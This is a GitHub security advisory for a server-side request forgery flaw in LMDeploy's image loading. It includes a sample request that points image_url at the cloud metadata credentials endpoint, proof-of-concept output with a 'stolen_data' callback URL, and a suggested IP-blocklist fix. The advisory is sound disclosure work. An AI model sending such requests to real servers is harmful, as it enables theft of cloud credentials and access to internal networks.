# [H] LMDeploy has Server-Side Request Forgery (SSRF) via Vision-Language Image Loading

## Summary
Severity: High
Advisory: GHSA-6w67-hwm5-92mq
CVE: CVE-2026-33626
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-21
Source: https://github.com/advisories/GHSA-6w67-hwm5-92mq
Type: github-advisory

## Affected
- PyPI: `lmdeploy` — affected >=0

## Details
## Summary

A Server-Side Request Forgery (SSRF) vulnerability exists in LMDeploy's vision-language module. The `load_image()` function in `lmdeploy/vl/utils.py` fetches arbitrary URLs without validating internal/private IP addresses, allowing attackers to access cloud metadata services, internal networks, and sensitive resources.

## Affected Versions

- **Tested on:** main branch (2026-02-04)
- **Affected:** All versions prior to 0.12.3

## Vulnerable Code

**File:** `lmdeploy/vl/utils.py` (lines 64-67)
```python
def load_image(image_url: Union[str, Image.Image]) -> Image.Image:
    # ...
    if image_url.startswith('http'):
        response = requests.get(image_url, headers=headers, timeout=FETCH_TIMEOUT)
        # NO VALIDATION OF URL/IP BEFORE REQUEST
```

**Also affected:** `encode_image_base64()` function (lines 26-29)

## Root Cause

1. No validation of URLs before fetching
2. No blocklist for internal IPs (127.0.0.1, 169.254.x.x, 10.x.x.x, 192.168.x.x)
3. Server binds to `0.0.0.0` by default (api_server.py line 1393)
4. API keys disabled by default

## Attack Scenario

1. LMDeploy server deployed with vision-language model
2. Attacker sends request to `/v1/chat/completions` with malicious `image_url`:
```python
POST /v1/chat/completions
{
  "model": "internlm-xcomposer2",
  "messages": [{
    "role": "user", 
    "content": [
      {"type": "text", "text": "Describe this image"},
      {"type": "image_url", "image_url": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}
    ]
  }]
}
```

3. Server fetches URL without validation
4. Attacker receives cloud credentials

## Proof of Concept

### Verified Exploitation Result
```
╔═══════════════════════════════════════════════════════════════════════╗
║  LMDeploy SSRF Vulnerability - Proof of Concept                       ║
╚═══════════════════════════════════════════════════════════════════════╝

[1] Starting callback server on port 8889...
[2] Attacker URL: http://127.0.0.1:8889/SSRF_PROOF?stolen_data=AWS_SECRET_KEY
[3] Calling vulnerable load_image() function...

======================================================================
[+] SSRF CALLBACK RECEIVED!
======================================================================
    Time:       2026-02-04 16:10:57
    Path:       /SSRF_PROOF?stolen_data=AWS_SECRET_KEY
    Client:     127.0.0.1:51154
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
======================================================================

✅ SSRF VULNERABILITY CONFIRMED!
```

## Impact

- **Cloud Credential Theft:** Access AWS/GCP/Azure metadata APIs
- **Internal Service Access:** Reach services not exposed to internet  
- **Information Disclosure:** Port scan internal networks
- **Lateral Movement:** Pivot point for further attacks

## Recommended Fix
```python
from urllib.parse import urlparse
import ipaddress
import socket

BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),
]

def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ('http', 'https'):
            return False
        ip = socket.gethostbyname(parsed.hostname)
        ip_addr = ipaddress.ip_address(ip)
        return not any(ip_addr in network for network in BLOCKED_NETWORKS)
    except:
        return False
```

---

## Credit

This vulnerability was discovered as part of Orca Security's research.

**Researcher:** Igor Stepansky  
**Organization:** Orca Security  
**Emails:** 
igor.stepansky@orca.security  
iggy.p0pi@orca.security

## References
- https://github.com/InternLM/lmdeploy/security/advisories/GHSA-6w67-hwm5-92mq
- https://nvd.nist.gov/vuln/detail/CVE-2026-33626
- https://github.com/InternLM/lmdeploy/pull/4447
- https://github.com/InternLM/lmdeploy/commit/71d64a339edb901e9005358e0633fbbab367d626
- https://github.com/InternLM/lmdeploy
- https://github.com/InternLM/lmdeploy/releases/tag/v0.12.3
